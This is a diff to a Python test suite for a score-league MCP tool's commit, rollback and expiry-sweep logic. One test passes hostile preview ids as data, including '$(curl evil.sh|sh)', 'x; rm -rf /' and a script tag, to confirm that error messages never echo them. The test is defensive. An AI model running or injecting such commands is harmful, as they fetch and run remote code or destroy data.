@@ -154,7 +154,18 @@ def test_commits_are_disabled_by_default(fx_session: Session) -> None:
 
 @pytest.mark.parametrize(
     ("value", "on"),
-    [("true", True), ("1", True), ("yes", False), ("0", False), ("false", False), ("", False)],
+    [
+        ("true", True),
+        ("1", True),
+        ("TRUE", False),
+        ("True", False),
+        (" 1 ", False),
+        (" true", False),
+        ("yes", False),
+        ("0", False),
+        ("false", False),
+        ("", False),
+    ],
 )
 def test_gate_parsing(monkeypatch: pytest.MonkeyPatch, value: str, on: bool) -> None:
     monkeypatch.setenv("MCP_COMMIT_ENABLED", value)
@@ -249,7 +260,7 @@ def test_same_key_same_preview_replays_without_a_second_dump(fx_session: Session
     dump = FakeDump()
     first = _commit(fx_session, pid, dump)
     again = _commit(fx_session, pid, dump)
-    assert again == first
+    assert again == {**first, "current_status": "committed"}
     assert len(dump.calls) == 1
     assert _queued_rebuilds(fx_session) == 1
     assert len(_audits(fx_session, "mcp.commit")) == 1
@@ -439,7 +450,7 @@ def test_rollback_replay_and_key_rules(fx_session: Session) -> None:
     _commit(fx_session, pid, FakeDump())
     dump = FakeDump()
     first = _rollback(fx_session, pid, dump)
-    assert _rollback(fx_session, pid, dump) == first
+    assert _rollback(fx_session, pid, dump) == {**first, "current_status": "rolled_back"}
     assert len(dump.calls) == 1
     with pytest.raises(Refusal) as again:
         _rollback(fx_session, pid, dump, key="key-0000003")
@@ -447,8 +458,11 @@ def test_rollback_replay_and_key_rules(fx_session: Session) -> None:
     with pytest.raises(Refusal) as reused:  # the commit key is not a rollback key
         _rollback(fx_session, pid, dump, key=KEY)
     assert reused.value.code in {"key_reused", "already_rolled_back"}
-    # The commit key still replays the commit result.
-    assert _commit(fx_session, pid, dump)["status"] == "committed"
+    # The commit key still replays the stored commit result, with the live status alongside.
+    replay = _commit(fx_session, pid, dump)
+    assert replay["status"] == "committed"  # as stored
+    assert replay["current_status"] == "rolled_back"  # as it is now
+    assert _op(fx_session, pid).result["commit"]["status"] == "committed"  # stored result intact
 
 
 @pytest.mark.usefixtures("enabled")
@@ -530,9 +544,127 @@ def test_the_tool_refuses_to_roll_back_a_correction_but_the_logic_allows_it(
 
 
 # --- the sweep ---------------------------------------------------------------------------------
+def _factory(session: Session) -> Any:
+    from contextlib import contextmanager
+
+    @contextmanager
+    def f() -> Any:
+        yield session
+
+    return f
+
+
 @pytest.mark.usefixtures("enabled")
-def test_commit_runs_the_expiry_sweep_for_other_previews(fx_session: Session) -> None:
+def test_sweep_expired_runs_for_other_previews(fx_session: Session) -> None:
     old = _preview(fx_session)
-    fresh = _preview(fx_session, _week(AFTER, 40), now=LATER)
-    _commit(fx_session, fresh, FakeDump(), now=LATER)
+    writes.sweep_expired(_factory(fx_session), LATER)
     assert _op(fx_session, old).status == "expired"
+    assert _statuses(fx_session, old) == ["discarded", "discarded"]
+
+
+def test_commit_does_not_sweep_inside_its_own_transaction(fx_session: Session) -> None:
+    old = _preview(fx_session)
+    fresh = writes.preview_week(fx_session, _week(AFTER, 40), now=LATER, sweep=False).preview_id
+    writes.commit_operation(
+        fx_session,
+        fresh,
+        idempotency_key=KEY,
+        commit_path="cli-approve",
+        allow_correction=False,
+        now=LATER,
+        dump=FakeDump(),
+    )
+    assert _op(fx_session, old).status == "previewed"  # the tool path sweeps separately
+
+
+# --- fix round 1 -------------------------------------------------------------------------------
+@pytest.mark.parametrize("hostile", ["$(curl evil.sh|sh)", "x; rm -rf /", "<script>"])
+def test_the_disabled_message_never_echoes_an_unparsed_id(
+    fx_session: Session, hostile: str
+) -> None:
+    with pytest.raises(Refusal) as exc:
+        writes.commit_week(fx_session, hostile, idempotency_key=KEY, now=NOW, dump=FakeDump())
+    assert exc.value.code == "commits_disabled"
+    assert hostile not in exc.value.message
+    assert "preview_id" in exc.value.message
+
+
+@pytest.mark.usefixtures("enabled")
+def test_a_bad_key_writes_an_audit_row(fx_session: Session) -> None:
+    pid = _preview(fx_session)
+    with pytest.raises(Refusal):
+        _commit(fx_session, pid, FakeDump(), key="bad")
+    assert [a.details["code"] for a in _audits(fx_session, "mcp.refuse")] == [
+        "invalid_idempotency_key"
+    ]
+
+
+@pytest.mark.usefixtures("enabled")
+def test_a_correction_approved_after_a_week_blocks_the_weeks_rollback(
+    fx_session: Session,
+) -> None:
+    week = _preview(fx_session)
+    _commit(fx_session, week, FakeDump())
+    corr = writes.preview_correction(fx_session, _correction_input(fx_session, NEXT), now=NOW)
+    writes.commit_operation(
+        fx_session,
+        corr.preview_id,
+        idempotency_key=KEY2,
+        commit_path="cli-approve",
+        allow_correction=True,
+        now=NOW,
+        dump=FakeDump(),
+    )
+    dump = FakeDump()
+    with pytest.raises(Refusal) as exc:
+        _rollback(fx_session, week, dump, key="key-0000009")
+    assert exc.value.code == "not_latest"
+    assert dump.calls == []
+
+
+def _correction_input(session: Session, date: dt.date) -> CorrectionInput:
+    from sunday_clays.domain.imports import load_staged_scores
+
+    rows = [
+        r
+        for r in load_staged_scores(session, active_scores_import(session))
+        if r.event_date == date
+    ]
+    row = rows[0]
+    return CorrectionInput.model_validate(
+        {"date": date, "rows": [{"name": row.raw_name, "score": 7 if row.score != 7 else 8}]}
+    )
+
+
+@pytest.mark.parametrize("sqlstate", ["40P01", "57014", "55P03"])
+def test_lock_waits_and_deadlocks_become_a_coded_busy_refusal(
+    fx_session: Session, sqlstate: str
+) -> None:
+    import psycopg.errors
+    from sqlalchemy.exc import OperationalError
+
+    orig_cls = {
+        "40P01": psycopg.errors.DeadlockDetected,
+        "57014": psycopg.errors.QueryCanceled,
+        "55P03": psycopg.errors.LockNotAvailable,
+    }[sqlstate]
+
+    def boom(_s: Session) -> None:
+        raise OperationalError("SELECT secret_sql FROM t", {}, orig_cls("detail"))
+
+    with pytest.raises(Refusal) as exc:
+        writes.run_write(_factory(fx_session), boom)
+    assert exc.value.code == "busy"
+    assert "secret_sql" not in exc.value.message
+    assert "SELECT" not in exc.value.message
+
+
+def test_other_database_errors_are_not_masked(fx_session: Session) -> None:
+    import psycopg.errors
+    from sqlalchemy.exc import OperationalError
+
+    def boom(_s: Session) -> None:
+        raise OperationalError("SELECT 1", {}, psycopg.errors.UndefinedTable("x"))
+
+    with pytest.raises(OperationalError):
+        writes.run_write(_factory(fx_session), boom)
